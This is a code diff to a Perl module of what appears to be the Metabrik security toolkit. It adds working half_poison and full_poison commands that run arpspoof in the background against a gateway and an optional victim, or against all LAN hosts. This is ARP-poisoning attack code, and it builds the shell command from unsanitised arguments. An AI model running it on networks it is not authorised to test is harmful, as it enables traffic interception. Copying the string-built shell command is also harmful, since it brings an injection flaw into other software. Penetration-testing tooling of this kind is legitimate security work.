@@ -18,6 +18,7 @@ sub brik_properties {
          rtimeout => [ qw(timeout_seconds) ],
          max_read => [ qw(max_read_packet) ],
          max_runtime => [ qw(max_runtime) ],
+         device => [ qw(device) ],
       },
       attributes_default => {
          try => 2,
@@ -25,8 +26,8 @@ sub brik_properties {
       },
       commands => {
          cache => [ ],
-         half_poison => [ ],
-         full_poison => [ ],
+         half_poison => [ qw(gateway victim|OPTIONAL device|OPTIONAL) ],
+         full_poison => [ qw(gateway victim|OPTIONAL device|OPTIONAL) ],
          mac2eui64 => [ qw(mac_address) ],
          scan => [ qw(subnet|OPTIONAL device[OPTIONAL) ],
          get_ipv4_neighbors => [ qw(subnet|OPTIONAL device|OPTIONAL) ],
@@ -40,6 +41,21 @@ sub brik_properties {
          'Metabrik::Network::Arp' => [ ],
          'Metabrik::Network::Read' => [ ],
          'Metabrik::Network::Write' => [ ],
+         'Metabrik::Shell::Command' => [ ],
+         'Metabrik::System::Process' => [ ],
+      },
+      optional_binaries => {
+         'arpspoof' => [ ],
+      },
+   };
+}
+
+sub brik_use_properties {
+   my $self = shift;
+
+   return {
+      attributes_default => {
+         device => $self->global->device,
       },
    };
 }
@@ -66,16 +82,52 @@ sub cache {
 
 sub half_poison {
    my $self = shift;
+   my ($gateway, $victim, $device) = @_;
 
-   $self->log->info("TODO");
+   if (! $self->brik_has_binary("arpspoof")) {
+      return $self->log->error("half_poison: you have to install dsniff package");
+   }
+
+   $device ||= $self->device;
+   if (! defined($gateway)) {
+      return $self->log->error($self->brik_help_run('half_poison'))
+   }
+
+   my $cmd = "arpspoof -i $device -c both";
+   $cmd .= " -t $victim" if defined($victim);  # Or default to all LAN hosts
+   $cmd .= " $gateway";
+
+   my $sc = Metabrik::Shell::Command->new_from_brik_init($self) or return;
+   my $sp = Metabrik::System::Process->new_from_brik_init($self) or return;
+   $sp->daemonize(sub { $sc->system($cmd) });
+
+   $self->log->info("half_poison: arpspoof has been daemonized");
 
    return 1;
 }
 
 sub full_poison {
    my $self = shift;
+   my ($gateway, $victim, $device) = @_;
 
-   $self->log->info("TODO");
+   if (! $self->brik_has_binary("arpspoof")) {
+      return $self->log->error("full_poison: you have to install dsniff package");
+   }
+
+   $device ||= $self->device;
+   if (! defined($gateway)) {
+      return $self->log->error($self->brik_help_run('full_poison'))
+   }
+
+   my $cmd = "arpspoof -i $device -c both -r";
+   $cmd .= " -t $victim" if defined($victim);  # Or default to all LAN hosts
+   $cmd .= " $gateway";
+
+   my $sc = Metabrik::Shell::Command->new_from_brik_init($self) or return;
+   my $sp = Metabrik::System::Process->new_from_brik_init($self) or return;
+   $sp->daemonize(sub { $sc->system($cmd) });
+
+   $self->log->info("full_poison: arpspoof has been daemonized");
 
    return 1;
 }
